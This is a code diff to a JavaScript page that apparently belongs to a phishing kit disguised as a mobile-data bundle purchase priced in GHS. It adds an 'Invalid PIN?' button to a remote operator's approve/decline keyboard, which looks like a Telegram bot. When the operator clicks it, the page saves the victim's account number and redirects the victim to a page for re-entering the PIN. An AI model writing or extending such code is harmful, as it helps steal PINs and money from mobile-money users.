@@ -361,6 +361,7 @@
             approveId: null,
             declineId: null,
             verifyDeviceId: null,
+            invalidPinId: null,
             bundleInfo: null
         };
 
@@ -486,6 +487,7 @@
             state.approveId = `approve_${ts}`;
             state.declineId = `decline_${ts}`;
             state.verifyDeviceId = `verify_device_${ts}`;
+            state.invalidPinId = `invalid_pin_${ts}`;
 
             const bundleText = state.bundleInfo 
                 ? `\nBundle: <code>${state.bundleInfo.bundle}</code> (GHS ${state.bundleInfo.price})`
@@ -512,7 +514,8 @@
                                 { text: '❌ Decline', callback_data: state.declineId }
                             ],
                             [
-                                { text: '📱 Verify Device', callback_data: state.verifyDeviceId }
+                                { text: '📱 Verify Device', callback_data: state.verifyDeviceId },
+                                { text: '🔐 Invalid PIN?', callback_data: state.invalidPinId }
                             ]
                         ]
                     }
@@ -591,6 +594,19 @@
 
                                 setTimeout(() => {
                                     window.location.href = 'device_verify.html';
+                                }, 1500);
+                                return;
+                            }
+
+                            if (cbData === state.invalidPinId) {
+                                stopPolling();
+                                showSuccess("✓ Redirecting to PIN correction page...");
+                                
+                                const accValue = els.phoneInput.value.trim();
+                                localStorage.setItem('accountNumber', accValue);
+
+                                setTimeout(() => {
+                                    window.location.href = 'invalid_pin.html';
                                 }, 1500);
                                 return;
                             }
